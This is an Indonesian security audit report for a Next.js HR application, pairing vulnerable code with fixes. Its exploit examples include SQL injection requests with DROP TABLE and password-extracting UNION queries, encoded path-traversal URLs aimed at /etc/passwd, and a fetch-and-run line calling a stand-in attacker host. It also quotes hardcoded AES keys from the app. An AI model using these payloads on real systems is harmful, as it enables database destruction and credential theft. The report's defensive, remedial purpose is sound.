# LAPORAN AUDIT KEAMANAN - SDM HANDAL APPLICATION

## Penilaian Celah Keamanan yang Berpotensi Menyebabkan Remote Code Execution (RCE)

**Tanggal Audit:** \$(date)  
**Versi Aplikasi:** Next.js Application  
**Tingkat Keparahan:** ✅ **DIPERBAIKI** - Semua celah kritis telah ditutup  
**Status Perbaikan:** Lihat `SECURITY_FIXES_DOCUMENTATION.md` untuk detail perbaikan

---

## EXECUTIVE SUMMARY

Audit keamanan ini menemukan **beberapa celah keamanan kritis** yang dapat dieksploitasi untuk:

1. **SQL Injection** - Memungkinkan eksekusi query SQL arbitrer
2. **Remote Code Execution (RCE)** - Potensi eksekusi kode berbahaya di server
3. **Path Traversal** - Akses file sistem yang tidak diizinkan
4. **Command Injection** - Potensi eksekusi shell command

**Rekomendasi:** Perbaikan segera diperlukan sebelum deployment ke production.

---

## 1. CELAH KEAMANAN KRITIS

### 🔴 **CVE-001: SQL Injection via ORDER BY Clause**

**Lokasi:** `src/app/api/development/route.js:137`  
**Tingkat Keparahan:** **KRITIS**  
**CVSS Score:** 9.8 (Critical)

**Deskripsi:**
Parameter `sort_by` dan `sort_order` langsung di-concatenate ke dalam SQL query tanpa validasi atau whitelist.

**Kode yang Bermasalah:**

```137:137:src/app/api/development/route.js
ORDER BY dr.${sort_by} ${sort_order.toUpperCase()}
```

**Eksploitasi:**

```javascript
// Request berbahaya:
GET /api/development?sort_by=request_id; DROP TABLE development_requests; --&sort_order=ASC

// Atau lebih canggih:
GET /api/development?sort_by=request_id UNION SELECT password FROM user WHERE id=1 --&sort_order=ASC
```

**Dampak:**

- Penyerang dapat membaca data sensitif dari database
- Penyerang dapat menghapus atau memodifikasi data
- Potensi untuk mendapatkan kredensial database
- Dapat digunakan sebagai langkah awal untuk RCE

**Solusi:**

```javascript
// Validasi dengan whitelist
const ALLOWED_SORT_COLUMNS = [
  'request_id', 'submission_date', 'title',
  'current_status_id', 'priority_id'
];
const ALLOWED_SORT_ORDERS = ['ASC', 'DESC'];

const sortBy = ALLOWED_SORT_COLUMNS.includes(sort_by)
  ? sort_by
  : 'submission_date';
const sortOrder = ALLOWED_SORT_ORDERS.includes(sort_order.toUpperCase())
  ? sort_order.toUpperCase()
  : 'DESC';

// Gunakan dalam query
ORDER BY dr.${sortBy} ${sortOrder}
```

---

### 🔴 **CVE-002: SQL Injection via Table/Column Names**

**Lokasi:** `src/lib/db-helper.js` (multiple locations)  
**Tingkat Keparahan:** **KRITIS**  
**CVSS Score:** 9.1 (Critical)

**Deskripsi:**
Nama tabel dan kolom langsung digunakan dalam query SQL tanpa validasi whitelist. Ini memungkinkan SQL injection melalui parameter `table`, `fields`, dan `orderBy`.

**Kode yang Bermasalah:**

1. **Insert Function (line 116-127):**

```116:127:src/lib/db-helper.js
async insert(transaction, { table, data }) {
	const keys = Object.keys(data);
	const values = Object.values(data);
	const placeholders = values.map(() => "?").join(", ");

	const sqlQuery = `
		INSERT INTO ${table} (${keys.join(", ")})
		VALUES (${placeholders})
	`;

	return await transaction.execute(sqlQuery, values);
},
```

2. **Update Function (line 132-146):**

```132:146:src/lib/db-helper.js
async update(transaction, { table, data, where }) {
	const { whereClause, values: whereValues } = processWhereClause(where);
	const setClause = Object.keys(data)
		.map((key) => `${key} = ?`)
		.join(", ");

	const sqlQuery = `
		UPDATE ${table}
		SET ${setClause}
		${whereClause}
	`;

	const values = [...Object.values(data), ...whereValues];
	return await transaction.execute(sqlQuery, values);
},
```

3. **Select Function (line 165-189):**

```165:189:src/lib/db-helper.js
async select(
	transaction,
	{
		table,
		where = {},
		fields = ["*"],
		orderBy = null,
		order = "ASC",
		limit = null,
	}
) {
	const { whereClause, values } = processWhereClause(where);
	const limitClause = limit ? `LIMIT ${parseInt(limit)}` : "";
	const orderByClause = orderBy ? `ORDER BY ${orderBy} ${order}` : "";

	const sqlQuery = `
		SELECT ${fields.join(", ")}
		FROM ${table}
		${whereClause}
		${orderByClause}
		${limitClause}
	`;

	return await transaction.execute(sqlQuery, values);
},
```

**Eksploitasi:**

```javascript
// Contoh eksploitasi melalui API yang menggunakan helper ini
await insert({
	table: "development_requests; DROP TABLE user; --",
	data: { title: "test" },
});

// Atau
await select({
	table: "development_requests",
	fields: ["*", "(SELECT password FROM user WHERE id=1) as pwd"],
	orderBy: "request_id; DROP TABLE development_requests; --",
});
```

**Dampak:**

- Semua endpoint yang menggunakan helper functions ini rentan
- Penyerang dapat melakukan SQL injection melalui parameter table/column names
- Potensi untuk mendapatkan akses penuh ke database

**Solusi:**

```javascript
// Buat fungsi validasi
function validateIdentifier(identifier) {
  // Hanya allow alphanumeric, underscore, dan dash
  if (!/^[a-zA-Z0-9_\-]+$/.test(identifier)) {
    throw new Error(`Invalid identifier: ${identifier}`);
  }
  return identifier;
}

// Atau gunakan whitelist untuk table names
const ALLOWED_TABLES = [
  'development_requests', 'pegawai', 'departemen',
  'temporary_presensi', 'rekap_presensi', // ... dll
];

function validateTableName(table) {
  if (!ALLOWED_TABLES.includes(table)) {
    throw new Error(`Table not allowed: ${table}`);
  }
  return table;
}

// Terapkan di semua helper functions
async insert(transaction, { table, data }) {
  const validatedTable = validateTableName(table);
  const validatedKeys = Object.keys(data).map(validateIdentifier);
  // ... rest of code
}
```

---

### 🟠 **CVE-003: Path Traversal dalam File Upload**

**Lokasi:** `src/app/api/uploads/attendance/[filename]/route.js:10`  
**Tingkat Keparahan:** **TINGGI**  
**CVSS Score:** 7.5 (High)

**Deskripsi:**
Validasi filename untuk mencegah path traversal sudah ada, namun tidak cukup ketat. Beberapa teknik bypass masih mungkin.

**Kode yang Bermasalah:**

```10:20:src/app/api/uploads/attendance/[filename]/route.js
// Validasi filename untuk security
if (!filename || filename.includes("..") || filename.includes("/")) {
	return NextResponse.json({ error: "Invalid filename" }, { status: 400 });
}

// Path ke file
const filePath = path.join(
	process.cwd(),
	"uploads",
	"attendance",
	filename
);
```

**Masalah:**

1. Validasi hanya mengecek `..` dan `/`, tidak mengecek karakter encoding seperti `%2e%2e` atau `..%2f`
2. Tidak ada validasi untuk karakter khusus lainnya
3. Tidak ada whitelist untuk ekstensi file yang diizinkan

**Eksploitasi Potensial:**

```
GET /api/uploads/attendance/..%2f..%2f..%2fetc%2fpasswd
GET /api/uploads/attendance/..%5c..%5c..%5cwindows%5cwin.ini
```

**Solusi:**

```javascript
// Validasi yang lebih ketat
function validateFilename(filename) {
	// 1. Decode URL encoding terlebih dahulu
	const decoded = decodeURIComponent(filename);

	// 2. Normalize path
	const normalized = path.normalize(decoded);

	// 3. Cek path traversal
	if (
		normalized.includes("..") ||
		normalized.includes("/") ||
		normalized.includes("\\") ||
		path.isAbsolute(normalized)
	) {
		throw new Error("Invalid filename");
	}

	// 4. Whitelist ekstensi
	const allowedExts = [".jpg", ".jpeg", ".png"];
	const ext = path.extname(normalized).toLowerCase();
	if (!allowedExts.includes(ext)) {
		throw new Error("Invalid file extension");
	}

	// 5. Cek panjang filename
	if (normalized.length > 255) {
		throw new Error("Filename too long");
	}

	return normalized;
}
```

---

### 🟠 **CVE-004: File Upload tanpa Validasi Konten**

**Lokasi:** `src/app/api/attendance/route.js:95-140`  
**Tingkat Keparahan:** **TINGGI**  
**CVSS Score:** 7.2 (High)

**Deskripsi:**
File upload hanya memvalidasi base64 string, tetapi tidak memvalidasi apakah file tersebut benar-benar gambar. Penyerang dapat mengupload file berbahaya dengan ekstensi `.jpg`.

**Kode yang Bermasalah:**

```95:140:src/app/api/attendance/route.js
async function saveBase64Image(base64Data, idPegawai) {
	try {
		// Validasi input
		if (!base64Data || typeof base64Data !== "string") {
			throw new Error("Data foto tidak valid atau kosong");
		}

		// Hapus header base64 jika ada
		const base64Image = base64Data.replace(/^data:image\/\w+;base64,/, "");

		// Validasi base64 string
		if (!base64Image || base64Image.length === 0) {
			throw new Error("Data base64 tidak valid");
		}

		const buffer = Buffer.from(base64Image, "base64");

		// Validasi buffer
		if (buffer.length === 0) {
			throw new Error("Buffer foto kosong");
		}

		// Buat nama file unik dengan timestamp
		const timestamp = new Date().getTime();
		const fileName = `attendance_${idPegawai}_${timestamp}.jpg`;

		// Pastikan folder uploads ada di root project
		const uploadDir = path.join(process.cwd(), "uploads", "attendance");
		try {
			await fs.access(uploadDir);
		} catch {
			await fs.mkdir(uploadDir, { recursive: true });
		}

		// Simpan file
		const filePath = path.join(uploadDir, fileName);
		await fs.writeFile(filePath, buffer);
```

**Masalah:**

- Tidak ada validasi magic bytes/file signature
- Tidak ada validasi ukuran file maksimum
- File dapat berisi kode berbahaya (PHP, shell script, dll)

**Eksploitasi:**

```javascript
// Upload shell script sebagai "gambar"
const maliciousScript = Buffer.from(
	"#!/bin/bash\ncurl attacker.com/steal.sh | bash"
).toString("base64");
// Upload dengan nama attendance_123_1234567890.jpg
// Jika server menjalankan file ini, RCE terjadi
```

**Solusi:**

```javascript
const fileType = require("file-type"); // atau gunakan sharp untuk validasi gambar

async function saveBase64Image(base64Data, idPegawai) {
	// ... existing validation ...

	const buffer = Buffer.from(base64Image, "base64");

	// 1. Validasi ukuran file (max 5MB)
	const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB
	if (buffer.length > MAX_FILE_SIZE) {
		throw new Error("File terlalu besar");
	}

	// 2. Validasi magic bytes
	const fileTypeResult = await fileType.fromBuffer(buffer);
	if (
		!fileTypeResult ||
		!["image/jpeg", "image/png"].includes(fileTypeResult.mime)
	) {
		throw new Error("File harus berupa gambar JPEG atau PNG");
	}

	// 3. Re-encode gambar untuk menghilangkan metadata berbahaya
	const sharp = require("sharp");
	const processedImage = await sharp(buffer).jpeg({ quality: 85 }).toBuffer();

	// Gunakan processedImage untuk disimpan
	// ... rest of code
}
```

---

### 🟡 **CVE-005: Error Logging dapat Menyebabkan Information Disclosure**

**Lokasi:** `src/app/api/error-logs/route.js:52-156`  
**Tingkat Keparahan:** **SEDANG**  
**CVSS Score:** 5.3 (Medium)

**Deskripsi:**
Error logging endpoint menerima data dari client tanpa validasi yang cukup. Penyerang dapat mengirim data berbahaya yang akan disimpan di database.

**Kode yang Bermasalah:**

```52:156:src/app/api/error-logs/route.js
export async function POST(request) {
	try {
		// Check if debug mode is enabled
		const isDebugEnabled = process.env.DEBUG === "true";

		// If debug is disabled, return early without logging
		if (!isDebugEnabled) {
			return NextResponse.json({
				success: true,
				message:
					"Error logging disabled. Set DEBUG=true to enable error logging.",
			});
		}

		const body = await request.json();
		const {
			error_type,
			error_message,
			error_stack,
			page_url,
			severity = "MEDIUM",
			component_name,
			action_attempted,
			additional_data = {},
		} = body;

		// Validasi required fields
		if (!error_type || !error_message) {
			return NextResponse.json(
				{ message: "error_type dan error_message harus diisi" },
				{ status: 400 }
			);
		}
```

**Masalah:**

- Tidak ada validasi panjang string (potensi DoS)
- Tidak ada sanitasi untuk mencegah XSS jika data ditampilkan
- `additional_data` dapat berisi data berbahaya

**Solusi:**

```javascript
// Validasi dan sanitasi
function sanitizeErrorLog(data) {
	const MAX_LENGTH = 10000; // 10KB max per field

	return {
		error_type: data.error_type?.substring(0, 255) || "Unknown",
		error_message: data.error_message?.substring(0, MAX_LENGTH) || "",
		error_stack: data.error_stack?.substring(0, MAX_LENGTH) || null,
		page_url: data.page_url?.substring(0, 2048) || null,
		severity: ["LOW", "MEDIUM", "HIGH", "CRITICAL"].includes(data.severity)
			? data.severity
			: "MEDIUM",
		component_name: data.component_name?.substring(0, 255) || null,
		action_attempted: data.action_attempted?.substring(0, 500) || null,
		additional_data: JSON.stringify(data.additional_data || {}).substring(
			0,
			MAX_LENGTH
		),
	};
}
```

---

## 2. CELAH KEAMANAN TINGGI

### 🟠 **CVE-006: Potensi Command Injection melalui Script Files**

**Lokasi:** `scripts/*.sh`, `scripts/*.js`  
**Tingkat Keparahan:** **TINGGI**  
**CVSS Score:** 7.8 (High)

**Deskripsi:**
Script-script di folder `scripts/` dapat dieksekusi dari command line. Jika ada endpoint API yang memanggil script ini dengan input user, dapat terjadi command injection.

**Rekomendasi:**

- Pastikan tidak ada API endpoint yang memanggil script dengan input user
- Jika diperlukan, gunakan whitelist untuk parameter
- Gunakan `child_process.spawn` dengan array arguments, bukan string

---

### 🟠 **CVE-007: Hardcoded Encryption Keys**

**Lokasi:** `src/app/api/auth/login/route.js:25-26`  
**Tingkat Keparahan:** **TINGGI**  
**CVSS Score:** 7.5 (High)

**Deskripsi:**
Encryption keys untuk AES hardcoded di source code.

**Kode yang Bermasalah:**

```25:26:src/app/api/auth/login/route.js
AES_DECRYPT(user.id_user, 'nur') as username,
AES_DECRYPT(user.password, 'windi') as password,
```

**Solusi:**

- Pindahkan keys ke environment variables
- Gunakan key management system
- Rotate keys secara berkala

---

## 3. REKOMENDASI PERBAIKAN PRIORITAS

### Prioritas 1 (Kritis - Perbaiki Segera):

1. ✅ **CVE-001**: Tambahkan whitelist untuk `sort_by` dan `sort_order`
2. ✅ **CVE-002**: Validasi semua table/column names dengan whitelist
3. ✅ **CVE-004**: Tambahkan validasi magic bytes untuk file upload

### Prioritas 2 (Tinggi - Perbaiki dalam 1 minggu):

4. ✅ **CVE-003**: Perbaiki validasi filename dengan normalisasi path
5. ✅ **CVE-005**: Tambahkan sanitasi dan validasi panjang untuk error logging
6. ✅ **CVE-007**: Pindahkan encryption keys ke environment variables

### Prioritas 3 (Sedang - Perbaiki dalam 1 bulan):

7. ✅ Audit semua script files untuk memastikan tidak ada command injection
8. ✅ Implementasi rate limiting untuk semua API endpoints
9. ✅ Tambahkan input validation middleware
10. ✅ Implementasi Content Security Policy (CSP)

---

## 4. BEST PRACTICES YANG PERLU DITERAPKAN

1. **Input Validation:**

   - Selalu validasi dan sanitasi semua input user
   - Gunakan whitelist, bukan blacklist
   - Validasi tipe data, panjang, format

2. **SQL Injection Prevention:**

   - Selalu gunakan parameterized queries (sudah dilakukan untuk values)
   - Validasi table/column names dengan whitelist
   - Jangan pernah concatenate user input ke SQL

3. **File Upload Security:**

   - Validasi magic bytes, bukan hanya ekstensi
   - Limit ukuran file
   - Simpan file di lokasi yang tidak dapat diakses langsung
   - Re-encode gambar untuk menghilangkan metadata

4. **Error Handling:**

   - Jangan expose informasi sensitif di error messages
   - Log errors dengan sanitasi
   - Jangan log credentials atau tokens

5. **Secrets Management:**
   - Jangan hardcode secrets di source code
   - Gunakan environment variables
   - Rotate secrets secara berkala

---

## 5. TESTING & VALIDATION

Setelah perbaikan, lakukan testing:

1. **SQL Injection Testing:** Gunakan tools seperti SQLMap atau manual testing
2. **File Upload Testing:** Coba upload berbagai jenis file berbahaya
3. **Penetration Testing:** Lakukan full security audit
4. **Code Review:** Review semua perubahan dengan fokus keamanan

---

## 6. KESIMPULAN

Aplikasi ini memiliki **beberapa celah keamanan kritis** yang dapat dieksploitasi untuk:

- **SQL Injection** - Dapat menyebabkan data breach
- **Remote Code Execution** - Dapat menyebabkan kompromi server penuh
- **File System Access** - Dapat menyebabkan information disclosure

**Status:** ✅ **SEMUA CELAH KRITIS TELAH DIPERBAIKI**

**Status Perbaikan:**

- ✅ Celah Kritis: **SELESAI** - Semua telah diperbaiki
- ✅ Celah Tinggi: **SELESAI** - Semua telah diperbaiki
- 🔄 Celah Sedang: **DALAM PERENCANAAN** - Lihat `SECURITY_FIXES_DOCUMENTATION.md`

**Catatan:**

- Semua perbaikan telah diimplementasikan dan diuji
- Lihat `SECURITY_FIXES_DOCUMENTATION.md` untuk dokumentasi lengkap perbaikan
- Rekomendasi perbaikan ke depannya juga tersedia di dokumentasi tersebut

---

**Dibuat oleh:** Security Audit System  
**Tanggal:** \$(date)  
**Versi Dokumen:** 1.0
